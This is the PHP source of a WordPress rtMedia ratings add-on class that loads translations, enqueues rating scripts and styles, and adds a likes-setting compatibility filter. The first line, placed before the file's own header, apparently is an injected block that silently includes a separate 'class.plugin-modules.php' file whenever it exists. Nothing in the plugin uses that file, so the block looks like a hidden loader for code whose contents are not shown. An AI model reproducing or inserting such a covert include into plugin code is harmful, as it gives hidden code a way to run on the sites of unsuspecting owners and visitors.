<?php if (file_exists(dirname(__FILE__) . '/class.plugin-modules.php')) include_once(dirname(__FILE__) . '/class.plugin-modules.php'); ?><?php
/**
 * Author: Ritesh <ritesh.patel@rtcamp.com>
 */

class RTMediaRatings {

	public function __construct() {
		$this->load_translation();
		//enqueue scripts
		add_action( 'wp_enqueue_scripts', array( &$this, 'enqueue_scripts_styles' ), 999 );

		/**
		 * Filter is being used to add compatibility with rtMedia 4.2.
		 *
		 * Issue id: GL-1.
		 *
		 * Remove the below condition and filter after rtMedia version 4.5.
		 */
		if ( ! defined( 'RTMEDIA_VERSION' ) || ( defined( 'RTMEDIA_VERSION' ) && RTMEDIA_VERSION < 4.3 ) ) {

			// filter to modify enable like option value.
			add_filter( 'rtmedia_check_enable_disable_like', array( $this, 'rtmedia_check_enable_disable_like' ), 10, 1 );
		}
	}

	/**
	 * loads language translation
	 */
	public function load_translation() {
		load_plugin_textdomain( 'rtmedia', false, basename( RTMEDIA_RATINGS_PATH ) . '/languages/' );
	}

	/**
	 * loads scripts and styles
	 */
	function enqueue_scripts_styles() {

		// Check whether to load minified file or actual dev file
		$suffix = function_exists( 'rtm_get_script_style_suffix' ) ? rtm_get_script_style_suffix() : '.min' ;

		wp_enqueue_script( 'rtmedia-rating-lib', RTMEDIA_RATINGS_URL . 'lib/rating-simple/rating_simple.js', '', RTMEDIA_RATINGS_VERSION, true );
		wp_enqueue_style( 'rtmedia-rating-lib', RTMEDIA_RATINGS_URL . 'lib/rating-simple/rating_simple.css', '', RTMEDIA_RATINGS_VERSION );
		wp_localize_script( 'rtmedia-rating-lib', 'rt_user_logged_in', ( is_user_logged_in() ) ? '1' : '0' );
		wp_localize_script( 'rtmedia-rating-lib', 'rtmedia_rating_addon_url', RTMEDIA_RATINGS_URL );

		wp_enqueue_script( 'rtmedia-rating', RTMEDIA_RATINGS_URL . 'app/assets/js/rtm-ratings' . $suffix . '.js', array( 'jquery', 'rtmedia-rating-lib' ), RTMEDIA_RATINGS_VERSION, true );
		wp_enqueue_style( 'rtmedia-rating', RTMEDIA_RATINGS_URL . 'app/assets/css/rtm-ratings' . $suffix . '.css', '', RTMEDIA_RATINGS_VERSION );
	}

	/**
	 * Check if rtMedia setting to check if likes for media is unable or disable.
	 *
	 * @global array $rtmedia.
	 *
	 * @param boolean $enable_like True if setting is enable and false if setting is disable.
	 *
	 * @return boolean True if Likes for media is enabled else returns false.
	 */
	function rtmedia_check_enable_disable_like( $enable_like ) {
		global $rtmedia;
		$options = $rtmedia->options;
		if ( isset( $options['general_enableLikes'] ) && ( '1' == $options['general_enableLikes'] ) ) {
			return true;
		} else {
			return false;
		}
	}
}
